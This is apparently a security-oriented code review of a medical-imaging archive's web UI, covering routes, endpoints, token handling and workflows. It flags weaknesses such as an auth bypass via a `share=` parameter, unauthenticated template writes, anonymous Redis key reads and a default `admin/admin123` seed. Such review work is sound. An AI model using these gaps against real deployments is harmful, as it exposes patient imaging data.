# Server-served web UI: legacy dashboard, login, settings page, fallback viewer, admin bridge

> **Area deep-dive** — part of the [PAXS Archive documentation](../README.md). Produced by static analysis of commit `e90d32c` (2026-10-08); line numbers refer to that commit. Findings here are consolidated, de-duplicated and prioritized in [CODE_REVIEW.md](../CODE_REVIEW.md) — where the two differ, CODE_REVIEW.md takes precedence. Labels such as `[read]`, `[verified]`, `[V]`, `[H]` or `[inferred]` describe how each claim was checked (read in code vs. inferred).

> ⚠️ **Baseline: this deep-dive describes commit `e90d32c`.** What changed in `5a32aa4` (fixes, regressions, new code and endpoints) is in [5a32aa4/03-viewer-js.md](5a32aa4/03-viewer-js.md), [5a32aa4/05-clinical-ldap-frontend.md](5a32aa4/05-clinical-ldap-frontend.md). The current status of every finding is in [CODE_REVIEW.md](../CODE_REVIEW.md).

**Method and limits**
- Read in full: `app/static/app.js` (4406 lines, 9 chunks), `index.html`, `login.html`, `viewer.html`, `viewer.js`, `settings/index.html`, `admin/index.html`, `admin/admin-bridge.js`, `studies-ui/index.html`, `viewer/index.html`, `viewer/app-config.js`, `viewer/paxs-study-list-enhance.js`, `viewer/paxs-mpr.js`, `viewer/sw.js`, `viewer/init-service-worker.js`, `viewer/silent-refresh.html`, `viewer/google.js`, `viewer/_headers`, `_redirects`, `serve.json`, `viewer-version.txt`, `admin-version.txt`.
- Skimmed: `styles.css` (structure via grep), `viewer/manifest.json` (head only), `paxs-*-theme.css` (grep for external URLs only).
- Build bundles were NOT read (listed in section 1b).
- Backend handlers were read only where the UI calls them, to check auth and data scope. Nothing was run; no browser test. Items marked "static" come from reading code, not a live test. Items marked "unverified" need a runtime check.

Severity: 🔴 blocking, 🟡 important, 🟢 nit.

---

## 1. Files covered

### 1a. In-scope source files

| Path | Lines | Purpose |
|---|---|---|
| app/static/index.html | 1259 | Dashboard shell served at `/` (main.py:563-567). Nav, feature cards, studies, reading, workflow, nodes, admin (16 sub-tabs), settings (9 sub-tabs), modals, login modal. Loads `app.js?v=42` and `styles.css?v=32`. |
| app/static/app.js | 4406 | Dashboard controller: all views, auth, admin console, upload. See section 3. |
| app/static/login.html | 253 | Standalone `/login` page (main.py:695-710). Inline `<style>` and `<script>`. Sign-in and register tabs. |
| app/static/viewer.html | 242 | Built-in fallback viewer, used at `/viewer` only when `app/static/viewer/` is absent (main.py:643-646). Loads three.js from cdnjs (line 9). |
| app/static/viewer.js | 298 | Logic for viewer.html: study load, series thumbnails, rendered instances, cine, W/L presets, Three.js orientation cube. |
| app/static/settings/index.html | 1096 | Organization settings, report templates, licensing at `/settings` (main.py:678-686). Inline `<script>` (lines 691-1094). |
| app/static/admin/index.html | 18 | PaxsViewer Control Panel shell at `/admin` (main.py:653-664). Meta CSP at line 6-9. |
| app/static/admin/admin-bridge.js | 174 | Shim that installs `window.electronApi` over `/api/v1/admin-panel/*`. |
| app/static/admin/admin-version.txt | 1 line (no newline) | Content `1.1.0`. |
| app/static/studies-ui/index.html | 16 | Shell for the React study list at `/studies-ui` and `/viewer` root (main.py:599-618). Loads bundle `index-Bxwcl_Y6.js`, `viewer/paxs-study-list-enhance.js?v=37`, `index-B97LyhE3.css`. |
| app/static/viewer/index.html | 1 (minified, 6.5 KB) | PaxsViewer (OHIF v3 fork) entry. Loads `app.bundle.29858d89fb4b9b9d.js`, `paxs-study-list-enhance.js?v=37`, `paxs-mpr.js?v=37`, theme CSS. |
| app/static/viewer/app-config.js | 58 | PaxsViewer data source: DICOMweb roots `/dicom-web`, no token, STOW enabled. Header comment (lines 4-7) states guest/anonymous scope is used. |
| app/static/viewer/paxs-study-list-enhance.js | 941 | PAXS-authored. Study-list thumbnails, "3D MPR" button, report modal, viewer footer with attribution, user chip and sign-out, silent refresh (dead, see F13). |
| app/static/viewer/paxs-mpr.js | 2230 | PAXS-authored. 3D MPR workspace: WebGL2 3D-texture slicing, CPU fallback, server reslice, Three.js cutplanes and raymarch, measurements, PET fusion overlay. |
| app/static/viewer/paxs-study-list-theme.css | 464 | Study-list theme (grep: no external URLs). |
| app/static/viewer/paxs-viewer-theme.css | 755 | PaxsViewer theme (grep: no external URLs). |
| app/static/styles.css | 1964 | Dashboard stylesheet (skimmed). 53 matches for `:root`/`data-theme`/`@media`. Dark is default; light is `html[data-theme=light]`, set by `applyTheme` (app.js:111-127). No `url()`, `@import`, or external hosts. |
| app/static/viewer/google.js | 1 (minified) | Unreferenced. Google OIDC config (client_id, cloud-healthcare scopes) and OHIF QA dataset URLs. See F27. |
| app/static/viewer/silent-refresh.html | 25 | OIDC silent-renew page. Unreferenced by any page. |
| app/static/viewer/sw.js | 15 | Service-worker stub. Caches nothing. |
| app/static/viewer/init-service-worker.js | 5 | Unregisters every service worker on the origin. |
| app/static/viewer/viewer-version.txt | 1 | `3.13.0-beta.89 (PaxsViewer)`. Fetched by app.js:303 for feature detection. |
| app/static/viewer/manifest.json | - | PWA manifest, name "PaxsServer Viewer" (head only read). |
| app/static/viewer/_headers, _redirects, serve.json | - | Netlify/serve configs from the OHIF build. Inert under FastAPI. |

### 1b. Compiled and vendored assets (not read)

- **PaxsViewer viewer build (OHIF v3 fork)**: `app/static/viewer/*.bundle.<hash>.js` (most of ~200 top-level entries; listing truncated), `app.bundle.29858d89fb4b9b9d.js`, `app.bundle.css`, numbered `*.css` / `*.css.map`, and 5 `*.wasm` modules (`0ddf…`, `34b1…`, `37fa…`, `5130…`, `776f…`; likely DICOM image codecs, not verified). Entry: `viewer/index.html`.
- **PaxsViewer subfolders**: `viewer/assets/` (icons, logos, segmentation/tools/worklist/images), `viewer/dicom-microscopy-viewer/` (cjs, esm, wasm; `dicomMicroscopyViewer.min.js` 3.1 MB), `viewer/ort/` (not inspected), `viewer/customizations/` (not inspected).
- **Study-list React build**: `app/static/studies-ui/assets/index-*.js` (12 modules) and `index-*.css` (10). Entry `index-Bxwcl_Y6.js`. Plus `favicon.svg`, `icons.svg`.
- **Control Panel React build**: `app/static/admin/assets/index-DZaX6ItW.js` (module) and `index-iyLN2ywI.css`. Entry for `admin/index.html`.
- **Third-party vendored (not read)**: `viewer/three.min.js` (589 KB; version not verified in file), `viewer/es6-shim.min.js`, `viewer/polyfill.min.js`, `viewer/oidc-client.min.js` (only used by silent-refresh.html), `viewer/favicon.ico`.
- **Uploaded assets**: `app/static/uploads/logo_logomain.png` (written by the org-settings logo upload; see F7).

---

## 2. Page map

### 2a. URL to file

| URL | Served by | File | Auth gate | Notes |
|---|---|---|---|---|
| `/` | main.py:563-567 | static/index.html | ViewerAuthGate (main.py:268-331): no `paxs_session` cookie -> 303 `/login?next=`; cookie validated in DB for `/` | Dashboard |
| `/login`, `/login/` | main.py:695-710 | static/login.html | none; signed-in users 303 to role landing | `?next=` forwarded to the API (F9) |
| `/logout` | main.py:713-719 | (redirect) | none | GET. Clears cookie, 303 to `/login`. Does NOT revoke DB session (F11) |
| `/viewer`, `/viewer/`, `/viewer/index.html`, `/viewer/viewer` | main.py:599-618 (when viewer/ exists) | viewer/index.html if `StudyInstanceUIDs` or `study` query present, else studies-ui/index.html | ViewerAuthGate; `share=` anywhere in query bypasses it (main.py:308) | Root = PAXS study list; query = PaxsViewer deep link |
| `/viewer` (viewer/ absent) | main.py:643-646 | static/viewer.html | ViewerAuthGate | Built-in fallback viewer |
| `/viewer/*` | main.py:620 (SpaStaticFiles) | viewer/* | assets bypass the gate by extension (main.py:304-306) | |
| `/studies-ui`, `/studies-ui/` | main.py:669-675 | studies-ui/index.html | gated | React study list |
| `/settings`, `/settings/` | main.py:680-686 | settings/index.html | gated | Org settings, templates, licensing |
| `/admin`, `/admin/` | main.py:656-661 (`ADMIN_PANEL_ENABLED` default True, config.py:290) | admin/index.html | NOT in gated list (main.py:295-300) | Shell public; API admin-gated (F20) |
| `/static/*` | main.py:560 (CachedStaticFiles) | static/* incl. app.js, styles.css, viewer.js, uploads/, logo/ | none | Upload target (F7) |
| `/PaxsViewer-logo.png` | main.py:632-639 | logo/paxsviewer-logo.png | none | |
| `/terms` | main.py:727-734 | feature-plans/terms.md (text/markdown) | none | Footer modal, app.js:438-465 |
| `/paxs-viewer-guide` | linked from paxs-study-list-enhance.js:363, paxs-mpr.js:556 | - | - | Route not reviewed |
| `/viewer/viewer-version.txt`, `/admin/admin-version.txt` | static | - | none | Feature detection (app.js:303, 314) |

### 2b. Endpoint inventory (every fetch/XHR in the non-bundle JS and inline scripts)

Auth column: **Bearer** = sent by app.js `api()` (adds `Authorization: Bearer <paxs_token>`, app.js:63-80). **cookie** = plain `fetch` that relies on the HttpOnly `paxs_session` cookie. **none** = no credentials sent. Methods are from the code at the cited line. The app.js list was produced by grep of every `api(`/`fetch(` call site, then matched to the reading.

#### app.js (dashboard)

| Area | Method + path | Line(s) | Auth |
|---|---|---|---|
| Session | POST `/api/v1/auth/refresh` | 46 | cookie |
| | POST `/api/v1/auth/login` or `/register` (body JSON) | 591 | none |
| | GET `/api/v1/auth/me` | 2192, 4391 | Bearer |
| | POST `/api/v1/auth/logout` | 4270 | cookie |
| Dashboard | GET `/api/v1/triage`; POST `/api/v1/triage/{id}/review` | 133, 150 | Bearer |
| | GET `/api/v1/stats` | 159, 1739 | Bearer |
| | GET `/dicom-web/series?includefield=all` (modality list) | 175, 809 | Bearer header (via api()) |
| | GET `/api/v1/tenants` | 195, 3012 | Bearer |
| | GET `/api/v1/health` | 2473, 2496, 2689, 4348, 4384 | Bearer if token |
| | GET `/viewer/viewer-version.txt`; GET `/admin/admin-version.txt` | 303, 314 | none |
| | GET `/terms` | 444 | none |
| Studies | GET `/api/v1/studies?page&limit&sort&order&state&critical&reported&oru&his&search&modality&tenant&from&to` | 232 | Bearer |
| | DELETE `/api/v1/studies/{uid}` | 4309 | Bearer |
| | GET `/api/v1/reports?study_uid=` | 474 | Bearer |
| | POST `/api/v1/share` `{study_uid}` | 511 | Bearer |
| | POST `/dicom-web/studies` (STOW-RS, multipart/related) | 3925 | cookie only (no Authorization header) |
| | POST `/api/v1/nodes/{ae}/web/upload[?accelerated=1&progress=1]` | 3474 | Bearer |
| Reading | GET `/api/v1/worklist-tasks/counts`; GET `/api/v1/worklist-tasks?state&page&limit&radiologist` | 1421, 1436 | Bearer |
| | POST `/api/v1/worklist-tasks/{uid}/stat` `{on}`, `/assign` `{radiologist}`, `/read`, `/unread` | 1494-1521 | Bearer |
| Workflow | GET `/api/v1/worklist?status=`; POST `/api/v1/worklist`; PATCH `/api/v1/worklist/{id}` `{status}` | 1529, 1587, 1558, 1567 | Bearer |
| | GET `/api/v1/mpps` | 1602 | Bearer |
| | GET `/api/v1/commitments?status=` | 1633 | Bearer |
| Nodes | GET `/api/v1/nodes`; POST `/api/v1/nodes`; DELETE `/api/v1/nodes/{ae}` | 1656, 1717, 1706 (also 2528, 3601) | Bearer |
| | POST `/api/v1/nodes/{ae}/ping` | 1686 | Bearer |
| | POST `/api/v1/nodes/{ae}/find` or `/web/query` (C-FIND / QIDO) | 3320 | Bearer |
| | POST `/api/v1/nodes/{ae}/pull` or `/web/retrieve` (C-GET / WADO) | 3411 | Bearer |
| | POST `/api/v1/nodes/{ae}/send` `{study_uids}` (C-STORE SCU) | 3618 | Bearer |
| Settings | GET `/api/v1/config`; PATCH `/api/v1/config` `{updates}` | 746, 789 | Bearer |
| Database | GET `/api/v1/db/status`; POST `/api/v1/db/test`, `/db/configure`, `/db/init`, `/db/backup`; GET `/api/v1/db/backups`; GET and DELETE `/api/v1/db/backups/{name}` | 849-1025 | Bearer |
| Redis | GET `/api/v1/redis/status`; POST `/api/v1/redis/server/{start\|stop\|restart\|install}`; POST `/api/v1/redis/test`, `/configure`, `/flush` `{target,pattern}`, `/ping`; GET `/api/v1/redis/info`; GET `/api/v1/redis/keys?pattern&limit`; GET `/api/v1/redis/key?key=`; DELETE `/api/v1/redis/key` `{key}` | 1055-1405 | Bearer |
| DB pool | GET `/api/v1/db/perf`; POST `/api/v1/db/perf/replica` `{enabled}`; GET `/api/v1/db/perf/slow-queries`; GET `/api/v1/db/perf/explain?name\|sql`; POST `/api/v1/db/perf/slow-query` | 1839-1939 | Bearer |
| License | GET `/api/v1/license/status`, `/license/fingerprint`; POST `/api/v1/license/reload`; POST `/api/v1/license/upload` (multipart) | 1979-1980, 4238, 4249 | Bearer (4249 sets header by hand) |
| Protocols | GET/POST `/api/v1/clinical-protocols`; PATCH/DELETE `/api/v1/clinical-protocols/{id}`; GET `/api/v1/clinical-protocols/match?` | 2067-2160 | Bearer |
| Users | GET/POST `/api/v1/users`; PATCH `/api/v1/users/{id}` `{role}` or `{is_active}`; POST `/api/v1/users/{id}/reset-password`; DELETE `/api/v1/users/{id}`; POST `/api/v1/users/{id}/reset-lockout`; GET `/api/v1/users/locked`; GET `/api/v1/users/auth-audit?` | 2190-2455 | Bearer |
| Sessions | GET `/api/v1/users/sessions`; POST `/api/v1/users/sessions/{id}/revoke`; POST `/api/v1/users/sessions/revoke-user/{uid}` | 2303-2368 | Bearer |
| Router | GET/POST `/api/v1/routing/rules`; PUT/DELETE `/api/v1/routing/rules/{id}`; GET `/api/v1/routing/queue?status`; POST `/api/v1/routing/queue/{id}/retry`; POST `/api/v1/routing/queue/run` | 2539-2629, 4200 | Bearer |
| Critical | GET/POST `/api/v1/critical-results`; POST `/api/v1/critical-results/{id}/acknowledge` | 2643-2675 | Bearer |
| Storage | GET/POST `/api/v1/storage/backends`; PATCH/DELETE `/api/v1/storage/backends/{name}`; POST `/api/v1/storage/backends/{name}/test`; POST `/api/v1/storage/studies/{uid}/move` | 2708-2800 | Bearer |
| Lossy | GET/POST `/api/v1/compression/lossy/rules`; PUT/DELETE `.../{id}`; POST `/api/v1/compression/lossy/run` | 2812-2867 | Bearer |
| Lifecycle | GET/POST `/api/v1/lifecycle/rules`; PUT/DELETE `.../{id}`; GET `/api/v1/lifecycle/studies?state=ARCHIVED`; POST `.../studies/{uid}/restore`, `.../purge`; POST `/api/v1/lifecycle/run` | 2876-2965 | Bearer |
| Migration | GET `/api/v1/migration/jobs`; POST `/api/v1/migration/folder` `{folder_path}` | 2976, 3000 | Bearer |
| Tenants | GET/POST `/api/v1/tenants`; PATCH/DELETE `/api/v1/tenants/{id}`; POST `/api/v1/tenants/{id}/aes`; DELETE `/api/v1/tenants/{id}/aes/{ae}` | 3011-3080 | Bearer |
| Audit | GET `/api/v1/audit?limit=60` | 3105 | Bearer |
| Scripts | GET `/api/v1/scripts`; POST `/api/v1/scripts/reload`; GET `.../{name}/source`; POST `.../{name}/run` `{event,payload}`, `.../toggle`; PUT `/api/v1/scripts/{name}` (text/plain) | 3125-3195 | Bearer |
| Replication | GET `/api/v1/replication`; GET `/api/v1/replication/records?limit`; POST `/api/v1/replication/sweep`; POST `/api/v1/replication/studies/{uid}` | 3209-3262 | Bearer |
| Viewer share | (none in app.js; GET `/api/v1/share/{token}` is in viewer.js:120) | - | - |

#### settings/index.html (inline script; does not use Bearer)

| Method + path | Line | Auth |
|---|---|---|
| GET `/api/v1/settings/organization` | 719 | cookie (default same-origin) |
| POST `/api/v1/settings/organization` (multipart incl. `logo_file`) | 769 | cookie (server ignores it, F1) |
| GET `/api/v1/templates`; GET `/api/v1/templates/{id}` | 787, 823 | none |
| POST `/api/v1/templates`; PATCH `/api/v1/templates/{id}`; DELETE `/api/v1/templates/{id}` | 852, 868 | none (server ignores auth, F1) |
| GET `/api/v1/license/status`; GET `/api/v1/license/fingerprint` | 882-883 | cookie |
| POST `/api/v1/license/reload` | 943 | cookie |
| POST `/api/v1/license/upload` (multipart) | 966 | cookie |
| POST `/api/v1/license/activate` `{license_b64}` | 991 | cookie |
| POST `/api/v1/license/activate-online` `{activation_key, customer_email, portal_url}` | 1021 | cookie (portal_url is user input sent to the server, see open questions) |
| POST `/api/v1/license/validate-online` | 1047 | cookie |

#### login.html (inline script)

| Method + path | Line | Auth |
|---|---|---|
| POST `/api/v1/auth/login` or `/api/v1/auth/register`, with `?next=` if present | 228-235 | none; reads `data.access_token`, `data.redirect_to` |

#### viewer/paxs-study-list-enhance.js (runs on /studies-ui and /viewer)

| Method + path | Line | Auth |
|---|---|---|
| GET `/dicom-web/studies?limit=200&includefield=0020000D,00080061,00100010,00081030` | 128 | cookie (no header) |
| GET `/dicom-web/studies/{uid}/series?limit=1&includefield=…` | 137-138 | cookie |
| GET `/dicom-web/studies/{uid}/series/{suid}/instances?limit=1&includefield=00080018` | 144-146 | cookie |
| GET `/dicom-web/studies/{uid}/series/{suid}/instances/{sop}/thumbnail` | 162-165 | cookie |
| GET `/api/v1/reports/study/{uid}` | 586 | Bearer if token (paxsAuthHeaders, 861-868) |
| GET `/api/v1/templates?modality=` | 603 | Bearer if token |
| POST `/api/v1/reports/save` `{study_instance_uid, findings, impression, status: DRAFT\|FINALIZED}` | 638 | Bearer if token |
| GET `/api/v1/reports/print/{uid}` (`window.open`) | 628 | cookie (new tab) |
| POST `/api/v1/auth/refresh` | 851 | cookie; never runs (F13) |
| GET `/api/v1/auth/me` | 873 | cookie |
| POST `/api/v1/auth/logout` | 924 | cookie |

#### viewer/paxs-mpr.js (3D MPR workspace)

| Method + path | Line | Auth |
|---|---|---|
| GET `/dicom-web/studies/{uid}/series?includefield=0020000E,00080060,0008103E,00201209` | 666 | cookie |
| GET `/api/v1/volume/{series}/info` | 734, 1856 | cookie |
| GET `/api/v1/volume/{series}/data` and `?downsample=2` | 771, 812, 1859 | cookie |
| GET `/api/v1/volume/{series}/mpr/slice?plane&index&window_center&window_width` | 1460 | cookie (thin-client mode) |
| GET `/api/v1/fusion/{study}` | 1828 | cookie |
| Script: `/viewer/three.min.js`; fallback `https://cdnjs.cloudflare.com/…/three.min.js` | 98, 107 | - (CDN blocked by CSP, F21) |

#### viewer/viewer.js (fallback viewer, viewer.html)

| Method + path | Line | Auth |
|---|---|---|
| GET `/api/v1/share/{token}` (token from `?share=`, unencoded) | 118-120 | none |
| GET `/api/v1/studies/{uid}` | 139 | cookie |
| GET `/dicom-web/studies/{uid}/series/{series}/instances` | 174 | cookie |
| GET `/dicom-web/studies/{uid}/series/{series}/instances/{sop}/rendered?viewport&window` | 195 | cookie |

#### admin/admin-bridge.js (base `/api/v1/admin-panel`)

| Method + path | Line | Auth |
|---|---|---|
| GET `/status` and GET `/logs` (poll every `monitorIntervalMs`, default 5000) | 72-74, 166-173 | Bearer (from localStorage) |
| GET `/config`; POST `/config` | 146-147, 150, 166 | Bearer; POST needs ADMIN server-side (admin_panel.py:43-49) |
| POST `/actions/start-all`, `stop-all`, `restart` `{service}`, `launch-viewer`, `launch-admin`, `open-viewer`, `open-admin` | 113-142 | Bearer; ADMIN server-side (admin_panel.py:52-70) |

#### viewer/app-config.js and index.html / studies-ui/index.html

- app-config.js: DICOMweb roots `/dicom-web`, `supportsStow: true`, no token (lines 33-47).
- index.html and studies-ui/index.html make no fetch calls of their own (bundles do; not read).

---

## 3. app.js architecture

**Structure.** One script, `"use strict"`, no modules, no framework. Globals and sections:

| Lines | Section |
|---|---|
| 1-106 | Helpers: `$`, `COLUMN_DEFS`, `loadCols` (localStorage), global `state` (line 22), `persistStudiesPrefs`, `silentRefresh` (40-61), `api` (63-80), `toast`, `fmtBytes` (90), `fmtDate` (98), `esc` (103-106) |
| 108-127 | Theme: `applyTheme` sets `data-theme` on `<html>`; persisted to localStorage `paxs_theme` |
| 129-154 | Triage (`loadTriage`) |
| 157-205 | Stats, modality list, tenant filter |
| 207-296 | Studies list: `loadStudies` (aborts the previous request, 207-212), status chips, sort indicators, column/density prefs |
| 298-338 | PaxsViewer integration: `checkViewer` (301), `checkAdminPanel` (312), `viewerUrl` (323-332, uses `PAXS_PUBLIC_BASE_URL`), `viewerLink` (334-338) |
| 340-406 | `renderStudies`: builds row HTML with template strings and inline handlers (see F5) |
| 408-465 | Terms/privacy modal, minimal markdown renderer `mdToHtml` |
| 467-504 | Radiology report viewer (`openReport`) |
| 506-537 | Share (`createShare`) and delete (`confirmDelete`) |
| 539-617 | Login UI: `setAuthMode`, `openLogin`, `doAuth` (575-617) |
| 619-646 | View switching: `VIEWS`, `switchView` (pushState history, per-view loaders) |
| 648-833 | Settings (`loadSettings`, `renderGroup`, `saveSettings`, PATCH `/api/v1/config`), modality registry |
| 835-1028 | Database tab (status, test, configure, init, backup, download, delete) |
| 1030-1415 | Redis tab (status, server actions, keys, inspect, flush, ping, info) |
| 1417-1524 | Reading worklist (counts, tasks, STAT, assign, read/unread) |
| 1526-1652 | Modality worklist, MPPS, storage commitments |
| 1654-1734 | DICOM nodes (ping, find, pull, web upload, delete, add) |
| 1736-1806 | Feature cards and admin console entry (`openAdminTab`, `loadAdminSubTab`, 16 tabs) |
| 1808-1953 | DB pool panel; 8 s interval (see below) |
| 1955-2063 | Licensing (status, fingerprint, reload, .lic upload) |
| 2065-2166 | Clinical protocols |
| 2168-2461 | Users, sessions, auth audit, locked accounts |
| 2463-2524 | Services matrix and system overview |
| 2526-2685 | Smart router, routing queue, critical results |
| 2687-2972 | Storage backends, storage moves, lossy compression, lifecycle |
| 2974-3117 | Migration, tenants (VNA), audit |
| 3119-3271 | Scripts, DR replication |
| 3273-3631 | Schedule/nodes entry, C-FIND (`openFind`/`runFind`), C-GET (`openPull`/`runPull`), web upload (`runWebUpload`, NDJSON progress), forward (`openForward`) |
| 3633-3978 | Upload: DICOM detection (`isDicomFile` 3643-3653), batching (40 files / 48 MB, 3639-3641), STOW multipart POST (3925-3930), progress panel (3684-3880) |
| 3980-4335 | `bind()`: wires every static element once |
| 4337-4406 | Auth gate (`enterGate`, `finishBoot`, `boot`) |

**State.** One global `state` object (line 22): `page`, `limit`, `total`, `token` (from localStorage), `authMode`, `deleting`, sort/order/density/cols, filters, `role`, `username` (set only at login line 601-602 and boot 4394-4395), `config`, `features`, `gated`, `PAXS_PUBLIC_BASE_URL` (window). Side state: `RWL` (1418), `DBP` (1809), `_upPanel`/`_upAbort` (3685-3687), `_termsCache` (409), `_userModalAction` (2170). Dynamic lists are rebuilt with `innerHTML` on every load. Row actions are inline `onclick="fn('…')"` strings (F5) plus post-render `querySelectorAll(...).addEventListener` for ping, find, pull, delete, forward, etc.

**Token and session.**
- Access token (JWT, 15 min per app.js:69 comment): localStorage key `paxs_token`. Read at line 22; written at 52 (silentRefresh) and 603 (login); removed at 76 (401 path), 4266 (sign-out), 4401 (boot failure).
- Refresh token: HttpOnly cookie `paxs_session` set by the server (security.py:29-39). Not readable by JS. Used by `POST /api/v1/auth/refresh` (cookie) and by server-side gates.
- Server accepts Bearer or cookie on `get_current_user_any` (deps.py:89-105); most app.js calls use Bearer.
- `POST /api/v1/auth/logout` is called only by the in-app sign-out (4270). The header "Logout" link is `GET /logout` (index.html:54, main.py:713-719), which only clears the cookie.

**401 handling.** `api()` (app.js:63-80): on 401 with a token, call `silentRefresh()` (single-flight via `_refreshing`, 40-61), retry once, return the response if the retry is not 401. Otherwise clear the token and call `enterGate()` (4338-4345: adds `auth-gate` class, opens the login card; no backdrop dismissal). Callers without a token get the raw 401 and render "sign in" text. `enterGate` can be called many times in parallel; it is idempotent in effect.

**Polling and timers.**
- app.js: DB-pool slow-query refresh every 8 s (`DBP.sqTimer`, 1949-1952), guarded by panel visibility and cleared before re-create. Search debounce 300 ms (3989-3992). Upload panel auto-hide 8 s (3830). Redis retry `setTimeout` 600 ms (1184). Toast removal 3.2 s (87). No global polling.
- Other pages (see F22): enhance.js intervals of 0.8-2 s, admin-bridge 5 s, paxs-mpr cine 66 ms (until stopped), viewer.js cine 120 ms (until stopped).

**Event handling.** `bind()` (3981-4335) wires all static elements once. Global listeners: `popstate` (3983-3986), `storage` for theme (4072), `document` click to close the columns menu (4037-4039), `document` keydown Escape to close modals (4324-4334), backdrop clicks (4316-4322).

**Views and history.** `switchView(view)` toggles `.view.active`, calls the view's loader, and pushes `#view` into history (642-644). Initial hash is honored on boot (4371-4374).

---

## 4. User workflows (UI level)

**1. Login (dashboard)**
1. Open `/`. If there is no `paxs_session` cookie, the server redirects to `/login?next=/` (main.py:318).
2. Otherwise the page loads with `body.preboot`. `boot()` (4377-4404) applies theme, binds events, fetches `/api/v1/health` for `PAXS_PUBLIC_BASE_URL`, and detects viewer and admin paths.
3. With no token, `enterGate()` shows the blurred app and the login card (4389-4390).
4. Enter username and password (Enter submits, 4284). `doAuth` (575-617) POSTs `/api/v1/auth/login`, stores the token, sets `role`/`username`, loads the triage list, and calls `finishBoot()` (4347-4375), which loads stats, modalities, studies, and triage.
5. Register: switch to "Create account" (`setAuthMode`, 548-558), enter name/user/password, submit to `/api/v1/auth/register`. Default role PHYSICIAN (F8).
6. Alternative: `/login` page (login.html) does the same POST, stores the token, and redirects to `redirect_to`.
7. Sign out: header "Sign in"/username button (`btn-login`, 4264-4276) clears the token and calls `POST /api/v1/auth/logout`. The "Logout" link (index.html:54) instead goes to `GET /logout` (F11).

**2. Browse and search studies**
1. Click "Studies" (nav, index.html:67) -> `switchView('studies')` -> `loadStudies()` + `loadModalities()` + `loadTenantFilter()` (622-629).
2. Search box (`#search`) is debounced 300 ms (3989-3992). Modality select, tenant select (admin only; hidden otherwise, 192), from/to dates, status chips (All, Online, Archived, Critical, Reported, EMR, HIS; 4041-4058), sort headers (3998-4007), density toggle, and column menu (4008-4040) all re-query.
3. Rows render with a thumbnail (`s.thumbnail` URL from the API), patient name and ID, description and state badges, accession, series/instance counts, modality chips, and actions (eye, forward, share, delete; see 3-6).
4. Pagination: Prev/Next (4073-4074), "Page X of Y · N studies" (401-404).
5. Each row's thumbnail is also decorated by paxs-study-list-enhance.js on the /studies-ui and /viewer pages (F16); the dashboard list does not use it.

**3. Open a study in the viewer**
1. Click the "Viewer" button (if PaxsViewer is installed, `window.PAXS_VIEWER` true, app.js:335-338) or the eye icon (392).
2. `location.href = viewerUrl(uid)` (330-332) builds `${PAXS_PUBLIC_BASE_URL or origin}/viewer/viewer?StudyInstanceUIDs=<encoded>`.
3. On `/viewer/viewer` the OHIF-based PaxsViewer loads the study via `/dicom-web` (app-config.js). The enhance script adds a "3D MPR" button next to "View" in the study list and an in-viewer footer with a "Diagnostic Report" button (paxs-study-list-enhance.js:346-368; paxs-mpr.js:259-279).
4. The 3D MPR button opens the MPR workspace (paxs-mpr.js:281-292): probe WebGL2, load three.js, list volumetric series sorted by slice count, load `/api/v1/volume/{series}/info` and `/data`, render planes.
5. If the PaxsViewer dist is absent, `/viewer` serves viewer.html (fallback): loads `GET /api/v1/studies/{uid}`, lists series thumbnails, and renders each instance from `/dicom-web/.../rendered` with W/L presets, zoom, and cine (viewer.js:138-195).

**4. Admin tasks**
- **DICOM nodes** (Nodes nav, `openNodes` 3279-3283): register (`addNode` 1712-1734 with optional DICOMweb URL and credentials), Ping (C-ECHO), Find (C-FIND or QIDO modal, 3303-3370), Pull (C-GET or WADO, 3386-3435), Web Upload (STOW-RS with optional accelerator and progress, 3438-3551), Forward study, Delete node.
- **Users** (Admin -> Users, `loadUsers` 2190-2246): change role (select), enable/disable (switch), reset password (modal, min 6 chars, 2268-2285), delete (modal, 2287-2299). Add user (`addUser` 2248-2266). The UI locks your own row and the last active ADMIN; the server enforces (not reviewed).
- **Sessions** (Admin -> Sessions, 2301-2374): revoke one device or all devices for a user.
- **Auth audit and lockouts** (Admin -> Auth Audit, 2395-2461): filter the audit feed, unlock accounts.
- **Settings** (Settings nav, `loadSettings` 744-803): eight groups (System, DICOM, Modality, Interop, Storage, Security, Workflow, Database) plus Redis. Non-admins see read-only fields (`cfgRowHTML` 660-684). Admins get a save bar; "Apply changes" PATCHes `/api/v1/config` (778-803).
- **Database** (Settings -> Database, 835-1028): test, save config (writes `.env`, restart needed), initialize schema (can seed `admin/admin123`, F15), create/download/delete backups.
- **Redis** (Settings -> Redis, 1030-1415): status, start/stop/restart/install (admin), test/save config (admin), key browser with inspect (anonymous GET, F2), delete key (admin), flush (admin), ping, raw INFO.
- **Other admin tabs**: services matrix, system overview (2463-2524); smart router rules and send queue (2526-2629); critical results (2631-2685); storage backends, study moves, lossy and lifecycle rules, archived studies (2687-2972); migration folder import (2997-3008); tenants (3010-3090); audit (3092-3117); scripts (3119-3201; creates `.py` from a template, runs a sample event); replication (3203-3271); license (1955-2063: copy fingerprint, upload .lic, reload).

**5. Upload**
1. Click "Upload" (`#btn-upload`, index.html:235) -> hidden file input -> `uploadFiles(files)` (3882-3978).
2. Scan: each file is kept if it has a `.dcm`/`.dicom`/`.ima` extension or a `DICM` magic at offset 128 (3643-3653). Non-DICOM files are skipped and counted.
3. Batch: up to 40 files or 48 MB per request (3639-3641, 3671-3682).
4. POST each batch to `/dicom-web/studies` as `multipart/related; type="application/dicom"` with cookie auth only (3925-3930).
5. Progress panel (`upOpen` 3689-3748) shows Scan / Upload / Done phases and a Cancel button (AbortController, 3467-3468, 3721-3728). Result summary lists studies as NEW / EXISTED / SENT (3833-3860).
6. "Upload Folder" uses `webkitdirectory` (4095-4111). No drag-and-drop handler exists in the dashboard (the settings page has one for .lic files only).

**6. Share**
1. Click the link icon on a row -> `createShare(uid, name)` (507-529): POST `/api/v1/share` `{study_uid}`.
2. The modal shows patient name, "link valid until" time, a QR code (data URL), and the URL. "Copy URL" writes to the clipboard (4302-4305).
3. The recipient opens `/viewer?share=<token>`: the gate is bypassed for `share=` (main.py:308-310), and viewer.js calls `GET /api/v1/share/{token}` (118-125) to get the study UID, then loads the study.

**7. Delete**
1. Click the trash icon -> `confirmDelete(uid, name)` (532-537) -> modal "This permanently removes the study for {name} and all its files."
2. "Delete" -> DELETE `/api/v1/studies/{uid}` (4309). On success: toast, reload list and stats. No typed confirmation; a single modal click.

**8. Forward**
1. Click the arrow icon -> `openForward(uid, name)` (3594-3631): GET `/api/v1/nodes`, lists enabled and disabled nodes.
